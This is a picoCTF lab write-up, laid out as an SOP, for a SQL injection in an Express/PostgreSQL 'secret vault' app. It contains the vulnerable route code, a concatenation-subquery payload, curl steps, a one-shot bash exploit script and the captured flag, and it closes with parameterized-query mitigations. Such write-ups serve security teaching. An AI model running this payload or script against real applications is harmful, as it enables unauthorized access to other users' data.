# SOP — Secret Box (picoCTF)

**Category:** Web — SQL Injection
**Difficulty:** Easy
**Target:** http://candy-mountain.picoctf.net:58395/
**Source bundle:** `source.tar.gz`

---

## 1. Objective

Bypass authentication and exfiltrate the admin's secret (the flag) from a Node.js / Express + PostgreSQL "secret vault" application.

---

## 2. Recon

### 2.1 Source layout (from `source.tar.gz`)

```
app/
  src/
    server.js        # Express routes
    handler.js       # authMiddleware (token cookie -> user_id)
    db.js            # knex init + initdb() (loads FLAG env into admin's secret)
    views/           # EJS templates
db/
  initdb.sql         # schema + seed (admin user + fake flag)
docker-compose.yml
```

### 2.2 Key observations

- `initdb.sql` hardcodes the **admin user id**:
  `e2a66f7d-2ce6-4861-b4aa-be8e069601cb`
- `db.js` overwrites the admin's password and `secrets.content` with `process.env.FLAG` on startup.
- Auth is a UUID token in the `auth_token` cookie → `tokens.id` → `tokens.user_id`.
- `/` renders every secret where `owner_id = req.userId` — **anything inserted under my account is visible to me**.

### 2.3 The vulnerability

In `server.js`, `POST /secrets/create` builds SQL by string interpolation:

```js
// app/src/server.js
app.post('/secrets/create', authMiddleware, async (req, res) => {
    const userId = req.userId;
    if (!userId){
        res.clearCookie('auth_token');
        return res.redirect('/');
    }

    const content = req.body.content;
    const query = await db.raw(
        `INSERT INTO secrets(owner_id, content) VALUES ('${userId}', '${content}')`
    );

    return res.redirect('/');
});
```

`content` is **not parameterized** → classic SQL injection.

---

## 3. Exploitation

### 3.1 Step 1 — Register an account

```bash
BASE="http://candy-mountain.picoctf.net:58395"
curl -sS -X POST "$BASE/signup" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "username=hacker123" \
  --data-urlencode "password=hacker123"
```

### 3.2 Step 2 — Log in and capture the session cookie

```bash
curl -sS -c cookies.txt -X POST "$BASE/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "username=hacker123" \
  --data-urlencode "password=hacker123"
```

Server responds `302` with `Set-Cookie: auth_token=<uuid>`. Save it to `cookies.txt`.

### 3.3 Step 3 — SQLi payload via `content`

The trick is **Postgres string concatenation** (`||`). We keep the column count the same so the `INSERT` still works, and we use a subquery to pull the admin's flag into our new row.

**Payload (sent as `content` form field):**

```
x' || (SELECT content FROM secrets WHERE owner_id='e2a66f7d-2ce6-4861-b4aa-be8e069601cb') || '
```

**Resulting SQL on the server:**

```sql
INSERT INTO secrets(owner_id, content)
VALUES (
  '<my-uuid>',
  'x' || (SELECT content FROM secrets WHERE owner_id='e2a66f7d-2ce6-4861-b4aa-be8e069601cb') || ''
)
```

**Submit:**

```bash
ADMIN_ID="e2a66f7d-2ce6-4861-b4aa-be8e069601cb"
PAYLOAD="x' || (SELECT content FROM secrets WHERE owner_id='${ADMIN_ID}') || '"

curl -sS -b cookies.txt -X POST "$BASE/secrets/create" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "content=${PAYLOAD}"
```

### 3.4 Step 4 — Read the flag from the dashboard

```bash
curl -sS -b cookies.txt "$BASE/" | grep -A1 secret-content
```

The new row is rendered with `secrets[i].content` (no sanitization in the EJS view), so the admin's flag appears as the content of one of "my secrets".

---

## 4. Why it works

| Step | Mechanism |
|------|-----------|
| `req.userId` comes from the token → safe UUID, no injection surface there. | Trusted value. |
| `content` is template-interpolated into raw SQL. | Direct SQLi sink. |
| `'a' || subquery || 'b'` is a valid Postgres expression that returns one scalar. | Keeps the `INSERT` arity at 2 columns. |
| `INSERT` succeeds → new row owned by attacker. | `/` lists it back. |
| EJS view prints `content` raw. | No XSS / no output encoding needed. |

---

## 5. Mitigation

- **Use parameterized queries** for every user-controlled value:

  ```js
  await db.raw(
      `INSERT INTO secrets(owner_id, content) VALUES (?, ?)`,
      [userId, content]
  );
  // or with knex query builder:
  await db('secrets').insert({ owner_id: userId, content });
  ```
- Apply the same fix to every other `db.raw(` call site in the codebase (there are several `SELECT * FROM users WHERE ...` and `INSERT INTO users ...` paths that also interpolate — same class of bug).
- Centralize DB access through the query builder so interpolation is the exception, not the default.

---

## 6. Cleanup

- Delete the attacker account and any inserted rows after capture.
- Do not retain the `auth_token` cookie or `cookies.txt` from the engagement.

---

## 7. One-shot exploit script (reference)

```bash
#!/usr/bin/env bash
set -euo pipefail
BASE="http://candy-mountain.picoctf.net:58395"
ADMIN_ID="e2a66f7d-2ce6-4861-b4aa-be8e069601cb"
USER="hacker_$(date +%s)"
PASS="hacker_$(date +%s)"

curl -sS -X POST "$BASE/signup" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "username=$USER" --data-urlencode "password=$PASS" >/dev/null

curl -sS -c cookies.txt -X POST "$BASE/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "username=$USER" --data-urlencode "password=$PASS" >/dev/null

PAYLOAD="x' || (SELECT content FROM secrets WHERE owner_id='${ADMIN_ID}') || '"
curl -sS -b cookies.txt -X POST "$BASE/secrets/create" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "content=$PAYLOAD" >/dev/null

curl -sS -b cookies.txt "$BASE/" | grep -oE 'picoCTF\{[^}]+\}'
```

---

## 8. Result

**Flag:** `picoCTF{sq1_1nject10n_31c1577b}`
